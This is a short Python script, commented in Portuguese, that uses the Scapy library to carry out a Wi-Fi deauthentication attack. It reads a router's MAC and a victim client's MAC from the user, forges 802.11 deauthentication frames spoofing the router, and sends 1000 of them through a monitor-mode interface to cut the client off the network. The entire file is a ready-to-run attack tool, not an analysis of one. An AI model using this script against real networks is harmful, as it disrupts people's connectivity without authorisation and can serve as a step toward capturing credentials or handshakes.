#!/usr/bin/env python
# -*- coding: UTF-8 -*-

"""
  Esse arquivo tenta 
  fazer a negação de 
  conexão entre o roteador
  e o cliente

  Modificado em 19 de dezembro de 2016
  por Vitor Mazuco (vitor.mazuco@gmail.com)
"""

# Importação das bibliotecas necessárias
from scapy.all import *
import sys

interface = "wlan1mon" # Interface de WIFI que queria usar como modo monitor
BSSID = raw_input("Insira o MAC do Roteador ")
victim_mac = raw_input("Insira o MAC do cliente ")

frame= RadioTap()/ Dot11(addr1=victim_mac,addr2=BSSID, addr3=BSSID)/ Dot11Deauth() # Cria os pacotes de negação de autenticação

sendp(frame,iface=interface, count= 1000, inter= .1) # Faz o numero de vezes que é enviado o pacote de desautenticação.















